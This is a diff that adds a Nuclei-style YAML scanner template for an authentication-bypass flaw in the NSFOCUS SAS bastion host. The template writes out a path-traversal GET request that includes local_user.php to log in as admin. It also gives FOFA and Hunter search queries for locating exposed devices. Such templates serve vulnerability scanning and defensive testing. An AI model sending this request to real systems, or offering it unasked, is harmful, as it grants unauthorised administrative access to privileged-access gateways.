@@ -1,0 +1,28 @@
+http:
+    - matchers:
+        - dsl:
+            - status_code == 200 && contains((body), '200')
+          type: dsl
+      method: GET
+      path:
+        - '{{BaseURL}}/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/绿盟/web/apache2/www/local_user.php&method=login&user_account=admin'
+id: 绿盟-sas-bypassauth-status
+info:
+    author: hufei
+    description: |
+        绿盟SAS堡垒机存在任意用户登录漏洞，攻击者通过漏洞包含 www/local_user.php 实现任意⽤户登录
+    metadata:
+        fofa-query: title=="NSFOCUS&nbsp;SAS[H]"
+        hunter-query: app.name="NSFOCUS 绿盟 SAS"
+        max-request: 3
+        verified: true
+    name: 绿盟-sas-bypassauth-status
+    reference: https://mp.weixin.qq.com/s/qHPo0noFTvJoEcor00qtDg
+    severity: critical
+    tags:
+        - HVV
+        - 绿盟-sas
+        - bypassauth
+        - SAS
+        - ecor
+        - ECOR
